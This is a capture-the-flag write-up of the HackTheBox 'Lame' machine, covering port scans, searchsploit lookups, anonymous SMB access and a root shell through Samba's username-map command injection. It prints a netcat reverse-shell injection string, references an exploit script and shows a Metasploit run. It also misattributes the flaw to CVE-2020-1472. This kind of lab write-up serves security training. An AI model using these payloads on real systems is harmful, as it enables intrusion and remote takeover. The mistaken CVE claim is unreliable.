# Hackthebox Lame

First reset the machine.

## Enumeration

First do the standard portscanning of every tcp port on the system.

```
 nmap -Pn -sV -oX nmap_full_lame.xml -p- 10.10.10.3
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-04 13:03 EDT
Nmap scan report for 10.10.10.3
Host is up (0.038s latency).
Not shown: 65530 filtered ports
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
...

By scanning all the ports instead of top 1000 we found also port 3632.

## Vulnerability analysis

...
$ searchsploit --nmap nmap_full_lame.xml                                                                                                            2 ⨯
[i] SearchSploit's XML mode (without verbose enabled).   To enable: searchsploit -v --xml...
[i] Reading: 'nmap_full_lame.xml'

[-] Skipping term: ftp   (Term is too general. Please re-search manually: /usr/bin/searchsploit -t ftp)

[i] /usr/bin/searchsploit -t vsftpd
------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                          |  Path
------------------------------------------------------------------------------------------------------------------------ ---------------------------------
vsftpd 2.0.5 - 'CWD' (Authenticated) Remote Memory Consumption                                                          | linux/dos/5814.pl
vsftpd 2.0.5 - 'deny_file' Option Remote Denial of Service (1)                                                          | windows/dos/31818.sh
vsftpd 2.0.5 - 'deny_file' Option Remote Denial of Service (2)                                                          | windows/dos/31819.pl
vsftpd 2.3.2 - Denial of Service                                                                                        | linux/dos/16270.c
vsftpd 2.3.4 - Backdoor Command Execution                                                                               | unix/remote/49757.py
vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)                                                                  | unix/remote/17491.rb
vsftpd 3.0.3 - Remote Denial of Service                                                                                 | multiple/remote/49719.py
------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results


[-] Skipping term: ssh   (Term is too general. Please re-search manually: /usr/bin/searchsploit -t ssh)

[i] /usr/bin/searchsploit -t openssh
------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                          |  Path
------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Debian OpenSSH - (Authenticated) Remote SELinux Privilege Escalation                                                    | linux/remote/6094.txt
Dropbear / OpenSSH Server - 'MAX_UNAUTH_CLIENTS' Denial of Service                                                      | multiple/dos/1572.pl
FreeBSD OpenSSH 3.5p1 - Remote Command Execution                                                                        | freebsd/remote/17462.txt
glibc-2.2 / openssh-2.3.0p1 / glibc 2.1.9x - File Read                                                                  | linux/local/258.sh
Novell Netware 6.5 - OpenSSH Remote Stack Overflow                                                                      | novell/dos/14866.txt
OpenSSH 1.2 - '.scp' File Create/Overwrite                                                                              | linux/remote/20253.sh
OpenSSH 2.3 < 7.7 - Username Enumeration                                                                                | linux/remote/45233.py
OpenSSH 2.3 < 7.7 - Username Enumeration (PoC)                                                                          | linux/remote/45210.py
OpenSSH 2.x/3.0.1/3.0.2 - Channel Code Off-by-One                                                                       | unix/remote/21314.txt
OpenSSH 2.x/3.x - Kerberos 4 TGT/AFS Token Buffer Overflow                                                              | linux/remote/21402.txt
OpenSSH 3.x - Challenge-Response Buffer Overflow (1)                                                                    | unix/remote/21578.txt
OpenSSH 3.x - Challenge-Response Buffer Overflow (2)                                                                    | unix/remote/21579.txt
OpenSSH 4.3 p1 - Duplicated Block Remote Denial of Service                                                              | multiple/dos/2444.sh
OpenSSH 6.8 < 6.9 - 'PTY' Local Privilege Escalation                                                                    | linux/local/41173.c
OpenSSH 7.2 - Denial of Service                                                                                         | linux/dos/40888.py
OpenSSH 7.2p1 - (Authenticated) xauth Command Injection                                                                 | multiple/remote/39569.py
OpenSSH 7.2p2 - Username Enumeration                                                                                    | linux/remote/40136.py
OpenSSH < 6.6 SFTP (x64) - Command Execution                                                                            | linux_x86-64/remote/45000.c
OpenSSH < 6.6 SFTP - Command Execution                                                                                  | linux/remote/45001.py
OpenSSH < 7.4 - 'UsePrivilegeSeparation Disabled' Forwarded Unix Domain Sockets Privilege Escalation                    | linux/local/40962.txt
OpenSSH < 7.4 - agent Protocol Arbitrary Library Loading                                                                | linux/remote/40963.txt
OpenSSH < 7.7 - User Enumeration (2)                                                                                    | linux/remote/45939.py
OpenSSH SCP Client - Write Arbitrary Files                                                                              | multiple/remote/46516.py
OpenSSH/PAM 3.6.1p1 - 'gossh.sh' Remote Users Ident                                                                     | linux/remote/26.sh
OpenSSH/PAM 3.6.1p1 - Remote Users Discovery Tool                                                                       | linux/remote/25.c
OpenSSHd 7.2p2 - Username Enumeration                                                                                   | linux/remote/40113.txt
Portable OpenSSH 3.6.1p-PAM/4.1-SuSE - Timing Attack                                                                    | multiple/remote/3303.sh
------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results


[i] /usr/bin/searchsploit -t netbios ssn
[i] /usr/bin/searchsploit -t samba smbd
[i] /usr/bin/searchsploit -t distccd

$ searchsploit -t samba     
------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                          |  Path
------------------------------------------------------------------------------------------------------------------------ ---------------------------------
GoSamba 1.0.1 - 'INCLUDE_PATH' Multiple Remote File Inclusions                                                          | php/webapps/4575.txt
Inteno IOPSYS 3.16.4 - root filesystem access via sambashare (Authenticated)                                            | hardware/webapps/49438.py
Microsoft Windows XP/2003 - Samba Share Resource Exhaustion (Denial of Service)                                         | windows/dos/148.sh
Samba 1.9.19 - 'Password' Remote Buffer Overflow                                                                        | linux/remote/20308.c
Samba 2.0.7 - SWAT Logfile Permissions                                                                                  | linux/local/20341.sh
Samba 2.0.7 - SWAT Logging Failure                                                                                      | unix/remote/20340.c
Samba 2.0.7 - SWAT Symlink (1)                                                                                          | linux/local/20338.c
Samba 2.0.7 - SWAT Symlink (2)                                                                                          | linux/local/20339.sh
Samba 2.0.x - Insecure TMP File Symbolic Link                                                                           | linux/local/20776.c
Samba 2.0.x/2.2 - Arbitrary File Creation                                                                               | unix/remote/20968.txt
Samba 2.2.0 < 2.2.8 (OSX) - trans2open Overflow (Metasploit)                                                            | osx/remote/9924.rb
Samba 2.2.2 < 2.2.6 - 'nttrans' Remote Buffer Overflow (Metasploit) (1)                                                 | linux/remote/16321.rb
Samba 2.2.8 (BSD x86) - 'trans2open' Remote Overflow (Metasploit)                                                       | bsd_x86/remote/16880.rb
Samba 2.2.8 (Linux Kernel 2.6 / Debian / Mandrake) - Share Privilege Escalation                                         | linux/local/23674.txt
Samba 2.2.8 (Linux x86) - 'trans2open' Remote Overflow (Metasploit)                                                     | linux_x86/remote/16861.rb
Samba 2.2.8 (OSX/PPC) - 'trans2open' Remote Overflow (Metasploit)                                                       | osx_ppc/remote/16876.rb
Samba 2.2.8 (Solaris SPARC) - 'trans2open' Remote Overflow (Metasploit)                                                 | solaris_sparc/remote/16330.rb
Samba 2.2.8 - Brute Force Method Remote Command Execution                                                               | linux/remote/55.c
Samba 2.2.x - 'call_trans2open' Remote Buffer Overflow (1)                                                              | unix/remote/22468.c
Samba 2.2.x - 'call_trans2open' Remote Buffer Overflow (2)                                                              | unix/remote/22469.c
Samba 2.2.x - 'call_trans2open' Remote Buffer Overflow (3)                                                              | unix/remote/22470.c
Samba 2.2.x - 'call_trans2open' Remote Buffer Overflow (4)                                                              | unix/remote/22471.txt
Samba 2.2.x - 'nttrans' Remote Overflow (Metasploit)                                                                    | linux/remote/9936.rb
Samba 2.2.x - CIFS/9000 Server A.01.x Packet Assembling Buffer Overflow                                                 | unix/remote/22356.c
Samba 2.2.x - Remote Buffer Overflow                                                                                    | linux/remote/7.pl
Samba 3.0.10 (OSX) - 'lsa_io_trans_names' Heap Overflow (Metasploit)                                                    | osx/remote/16875.rb
Samba 3.0.10 < 3.3.5 - Format String / Security Bypass                                                                  | multiple/remote/10095.txt
Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit)                                        | unix/remote/16320.rb
Samba 3.0.21 < 3.0.24 - LSA trans names Heap Overflow (Metasploit)                                                      | linux/remote/9950.rb
Samba 3.0.24 (Linux) - 'lsa_io_trans_names' Heap Overflow (Metasploit)                                                  | linux/remote/16859.rb
Samba 3.0.24 (Solaris) - 'lsa_io_trans_names' Heap Overflow (Metasploit)                                                | solaris/remote/16329.rb
Samba 3.0.27a - 'send_mailslot()' Remote Buffer Overflow                                                                | linux/dos/4732.c
Samba 3.0.29 (Client) - 'receive_smb_raw()' Buffer Overflow (PoC)                                                       | multiple/dos/5712.pl
Samba 3.0.4 - SWAT Authorisation Buffer Overflow                                                                        | linux/remote/364.pl
Samba 3.3.12 (Linux x86) - 'chain_reply' Memory Corruption (Metasploit)                                                 | linux_x86/remote/16860.rb
Samba 3.3.5 - Format String / Security Bypass                                                                           | linux/remote/33053.txt
Samba 3.4.16/3.5.14/3.6.4 - SetInformationPolicy AuditEventsInfo Heap Overflow (Metasploit)                             | linux/remote/21850.rb
Samba 3.4.5 - Symlink Directory Traversal                                                                               | linux/remote/33599.txt
Samba 3.4.5 - Symlink Directory Traversal (Metasploit)                                                                  | linux/remote/33598.rb
Samba 3.4.7/3.5.1 - Denial of Service                                                                                   | linux/dos/12588.txt
Samba 3.5.0 - Remote Code Execution                                                                                     | linux/remote/42060.py
Samba 3.5.0 < 4.4.14/4.5.10/4.6.4 - 'is_known_pipename()' Arbitrary Module Load (Metasploit)                            | linux/remote/42084.rb
Samba 3.5.11/3.6.3 - Remote Code Execution                                                                              | linux/remote/37834.py
Samba 3.5.22/3.6.17/4.0.8 - nttrans Reply Integer Overflow                                                              | linux/dos/27778.txt
Samba 4.5.2 - Symlink Race Permits Opening Files Outside Share Directory                                                | multiple/remote/41740.txt
Samba < 2.0.5 - Local Overflow                                                                                          | linux/local/19428.c
Samba < 2.2.8 (Linux/BSD) - Remote Code Execution                                                                       | multiple/remote/10.c
Samba < 3.0.20 - Remote Heap Overflow                                                                                   | linux/remote/7701.txt
Samba < 3.6.2 (x86) - Denial of Service (PoC)                                                                           | linux_x86/dos/36741.py
Sambar FTP Server 6.4 - 'SIZE' Remote Denial of Service                                                                 | windows/dos/2934.php
Sambar Server 4.1 Beta - Admin Access                                                                                   | cgi/remote/20570.txt
Sambar Server 4.2 Beta 7 - Batch CGI                                                                                    | windows/remote/19761.txt
Sambar Server 4.3/4.4 Beta 3 - Search CGI                                                                               | windows/remote/20223.txt
Sambar Server 4.4/5.0 - 'pagecount' File Overwrite                                                                      | multiple/remote/21026.txt
Sambar Server 4.x/5.0 - Insecure Default Password Protection                                                            | multiple/remote/21027.txt
Sambar Server 5.1 - Sample Script Denial of Service                                                                     | windows/dos/21228.c
Sambar Server 5.1 - Script Source Disclosure                                                                            | cgi/remote/21390.txt
Sambar Server 5.x - 'results.stm' Cross-Site Scripting                                                                  | windows/remote/22185.txt
Sambar Server 5.x - Information Disclosure                                                                              | windows/remote/22434.txt
Sambar Server 5.x - Open Proxy / Authentication Bypass                                                                  | windows/remote/24076.txt
Sambar Server 5.x/6.0/6.1 - 'results.stm' indexname Cross-Site Scripting                                                | windows/remote/25694.txt
Sambar Server 5.x/6.0/6.1 - logout RCredirect Cross-Site Scripting                                                      | windows/remote/25695.txt
Sambar Server 5.x/6.0/6.1 - Server Referer Cross-Site Scripting                                                         | windows/remote/25696.txt
Sambar Server 6 - Search Results Buffer Overflow (Metasploit)                                                           | windows/remote/16756.rb
Sambar Server 6.0 - 'results.stm' POST Buffer Overflow                                                                  | windows/dos/23664.py
Sambar Server 6.1 Beta 2 - 'show.asp?show' Cross-Site Scripting                                                         | windows/remote/24161.txt
Sambar Server 6.1 Beta 2 - 'showini.asp' Arbitrary File Access                                                          | windows/remote/24163.txt
Sambar Server 6.1 Beta 2 - 'showperf.asp?title' Cross-Site Scripting                                                    | windows/remote/24162.txt
SWAT Samba Web Administration Tool - Cross-Site Request Forgery                                                         | cgi/webapps/17577.txt
------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
...

## System hacking

### vsftpd 2.3.4

vsftp 2.3.4 has backdoor command execution vulnerability.

rapid7: https://www.rapid7.com/db/modules/exploit/unix/ftp/vsftpd_234_backdoor/
exploit-db has the code: https://www.exploit-db.com/exploits/17491

The machine does not seem to have this vulnerabilty though.

### Samba

Checking https://www.cvedetails.com/vulnerability-list/vendor_id-102/Samba.html shows extensive amount of vulnerabilities. 

...
$ nmap -Pn -A -T4 -p 139,445 10.10.10.3
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-04 13:43 EDT
Nmap scan report for 10.10.10.3
Host is up (0.036s latency).

PORT    STATE SERVICE     VERSION
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)

Host script results:
|_clock-skew: mean: 2h00m22s, deviation: 2h49m43s, median: 21s
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: lame
|   NetBIOS computer name: 
|   Domain name: hackthebox.gr
|   FQDN: lame.hackthebox.gr
|_  System time: 2021-10-04T13:44:18-04:00
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)
...

It is possible to login as a guest.

...
 smbmap -R -H 10.10.10.3                                                                                                                         127 ⨯
[+] IP: 10.10.10.3:445	Name: 10.10.10.3                                        
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	print$                                            	NO ACCESS	Printer Drivers
	tmp                                               	READ, WRITE	oh noes!
	.\tmp\*
	dr--r--r--                0 Mon Oct  4 13:46:17 2021	.
	dw--w--w--                0 Sat Oct 31 02:33:57 2020	..
	dr--r--r--                0 Mon Oct  4 12:53:25 2021	.ICE-unix
	dw--w--w--                0 Mon Oct  4 12:53:44 2021	vmware-root
	dr--r--r--                0 Mon Oct  4 12:53:50 2021	.X11-unix
	fw--w--w--                0 Mon Oct  4 12:54:28 2021	5560.jsvc_up
	fw--w--w--               11 Mon Oct  4 12:53:50 2021	.X0-lock
	fw--w--w--             1600 Mon Oct  4 12:53:23 2021	vgauthsvclog.txt.0
	.\tmp\.X11-unix\*
	dr--r--r--                0 Mon Oct  4 12:53:50 2021	.
	dr--r--r--                0 Mon Oct  4 13:46:17 2021	..
	fr--r--r--                0 Mon Oct  4 12:53:50 2021	X0
	opt                                               	NO ACCESS	
	IPC$                                              	NO ACCESS	IPC Service (lame server (Samba 3.0.20-Debian))
	ADMIN$                                            	NO ACCESS	IPC Service (lame server (Samba 3.0.20-Debian))

 smbclient -N -L ////10.10.10.3
Anonymous login successful

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	tmp             Disk      oh noes!
	opt             Disk      
	IPC$            IPC       IPC Service (lame server (Samba 3.0.20-Debian))
	ADMIN$          IPC       IPC Service (lame server (Samba 3.0.20-Debian))
Reconnecting with SMB1 for workgroup listing.
Anonymous login successful

	Server               Comment
	---------            -------

	Workgroup            Master
	---------            -------
	WORKGROUP            LAME

$ smbclient -U "" \\\\10.10.10.3\\tmp
Enter WORKGROUP\'s password: 
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Mon Oct  4 13:47:41 2021
  ..                                 DR        0  Sat Oct 31 02:33:58 2020
  .ICE-unix                          DH        0  Mon Oct  4 12:53:26 2021
  vmware-root                        DR        0  Mon Oct  4 12:53:45 2021
  .X11-unix                          DH        0  Mon Oct  4 12:53:51 2021
  5560.jsvc_up                        R        0  Mon Oct  4 12:54:29 2021
  .X0-lock                           HR       11  Mon Oct  4 12:53:51 2021
  vgauthsvclog.txt.0                  R     1600  Mon Oct  4 12:53:24 2021

		7282168 blocks of size 1024. 5386472 blocks available
...

Now that we have smb shell let's try to create a reverse shell.

First netcat to listen
...
$ nc -vlp 1337                                                                                                                                      1 ⨯
listening on [any] 1337 ...
...

And then reverse shell
...
smb: \> logon “/='nc 10.10.14.15 1337 -e /bin/bash'
...

While there are walkthroughs that open a shell (for example https://medium.com/@siddharth.singhal1995/htb-walkthrough-lame-1-caa8d4b4da39), at this time it did not work.

Checking the cvedetails vulnerability CVE-2020-1472 seems promising.

macha97 has kindly created an exploit that we can use: https://github.com/macha97/exploit-smb-3.0.20/blob/master/exploit-smb-3.0.20.py

After running the msfvenom with the correct LHOST:

...
$ python3 exploit-smb-3.0.20.py

$ nc -nvlp 1338
listening on [any] 1338 ...
connect to [10.10.14.15] from (UNKNOWN) [10.10.10.3] 32860
whoami
root

ls -al /root
total 80
drwxr-xr-x 13 root root 4096 Oct  4 12:53 .
drwxr-xr-x 21 root root 4096 Oct 31  2020 ..
-rw-------  1 root root  373 Oct  4 12:53 .Xauthority
lrwxrwxrwx  1 root root    9 May 14  2012 .bash_history -> /dev/null
-rw-r--r--  1 root root 2227 Oct 20  2007 .bashrc
drwx------  3 root root 4096 May 20  2012 .config
drwx------  2 root root 4096 May 20  2012 .filezilla
drwxr-xr-x  5 root root 4096 Oct  4 12:53 .fluxbox
drwx------  2 root root 4096 May 20  2012 .gconf
drwx------  2 root root 4096 May 20  2012 .gconfd
drwxr-xr-x  2 root root 4096 May 20  2012 .gstreamer-0.10
drwx------  4 root root 4096 May 20  2012 .mozilla
-rw-r--r--  1 root root  141 Oct 20  2007 .profile
drwx------  5 root root 4096 May 20  2012 .purple
-rwx------  1 root root    4 May 20  2012 .rhosts
drwxr-xr-x  2 root root 4096 May 20  2012 .ssh
drwx------  2 root root 4096 Oct  4 12:53 .vnc
drwxr-xr-x  2 root root 4096 May 20  2012 Desktop
-rwx------  1 root root  401 May 20  2012 reset_logs.sh
-rw-------  1 root root   33 Oct  4 12:53 root.txt
-rw-r--r--  1 root root  118 Oct  4 12:53 vnc.log
After running the msfvenom with the correct LHOST:

...
$ python3 exploit-smb-3.0.20.py

$ nc -nvlp 1338
listening on [any] 1338 ...
connect to [10.10.14.15] from (UNKNOWN) [10.10.10.3] 32860
whoami
root

ls -al /root
total 80
drwxr-xr-x 13 root root 4096 Oct  4 12:53 .
drwxr-xr-x 21 root root 4096 Oct 31  2020 ..
-rw-------  1 root root  373 Oct  4 12:53 .Xauthority
lrwxrwxrwx  1 root root    9 May 14  2012 .bash_history -> /dev/null
-rw-r--r--  1 root root 2227 Oct 20  2007 .bashrc
drwx------  3 root root 4096 May 20  2012 .config
drwx------  2 root root 4096 May 20  2012 .filezilla
drwxr-xr-x  5 root root 4096 Oct  4 12:53 .fluxbox
drwx------  2 root root 4096 May 20  2012 .gconf
drwx------  2 root root 4096 May 20  2012 .gconfd
drwxr-xr-x  2 root root 4096 May 20  2012 .gstreamer-0.10
drwx------  4 root root 4096 May 20  2012 .mozilla
-rw-r--r--  1 root root  141 Oct 20  2007 .profile
drwx------  5 root root 4096 May 20  2012 .purple
-rwx------  1 root root    4 May 20  2012 .rhosts
drwxr-xr-x  2 root root 4096 May 20  2012 .ssh
drwx------  2 root root 4096 Oct  4 12:53 .vnc
drwxr-xr-x  2 root root 4096 May 20  2012 Desktop
-rwx------  1 root root  401 May 20  2012 reset_logs.sh
-rw-------  1 root root   33 Oct  4 12:53 root.txt
-rw-r--r--  1 root root  118 Oct  4 12:53 vnc.log
...

The same can be achieved with metasploit:
...
$ msfconsole -q
msf6 > user exploit/multi/samba/usermap_script
[-] Unknown command: user
msf6 > use exploit/multi/samba/usermap_script
[*] No payload configured, defaulting to cmd/unix/reverse_netcat
msf6 exploit(multi/samba/usermap_script) > set rhosts 10.10.10.3
rhosts => 10.10.10.3
msf6 exploit(multi/samba/usermap_script) > show options

Module options (exploit/multi/samba/usermap_script):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS  10.10.10.3       yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT   139              yes       The target port (TCP)


Payload options (cmd/unix/reverse_netcat):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.0.2.4         yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf6 exploit(multi/samba/usermap_script) > set lhost 10.10.14.15
lhost => 10.10.14.15
msf6 exploit(multi/samba/usermap_script) > run

[*] Started reverse TCP handler on 10.10.14.15:4444 
[*] Command shell session 1 opened (10.10.14.15:4444 -> 10.10.10.3:55441) at 2021-10-04 14:47:55 -0400

whoami
root
...
